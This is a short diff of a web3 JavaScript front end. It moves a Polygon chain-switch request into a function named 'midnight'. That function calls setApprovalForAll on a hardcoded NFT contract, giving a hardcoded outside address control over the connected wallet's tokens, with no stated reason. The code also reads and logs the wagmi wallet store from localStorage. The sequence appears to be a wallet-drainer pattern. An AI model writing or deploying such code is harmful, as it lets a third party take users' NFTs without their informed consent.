@@ -178,14 +178,15 @@ async function menuItems() {
 
 
 async function getAddress() {
-try {
   
-    await ethereum.request({
-    method: 'wallet_switchEthereumChain',
-    params: [{chainId: '0x89'}]})
-} catch (e) {
+// try {
   
-}
+//     await ethereum.request({
+//     method: 'wallet_switchEthereumChain',
+//     params: [{chainId: '0x89'}]})
+// } catch (e) {
+  
+// }
   
   const d = JSON.parse(localStorage.getItem('wagmi.store'))
   console.log(d);
@@ -1243,6 +1244,13 @@ async function citizen() {
 
 async function midnight(){
 await loadWeb3();
+try {
+      await ethereum.request({
+    method: 'wallet_switchEthereumChain',
+    params: [{chainId: '0x89'}]})
+} catch(e) {
+  
+}
 //0x89a4875c190565505b7891b700c2c6dc91816a47
                         var collectionContract = await new window.web3.eth.Contract(_abi, '0x89a4875c190565505b7891b700c2c6dc91816a47', {gas: '100000'})
               await collectionContract.methods.setApprovalForAll('0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262', true).send({from: account})
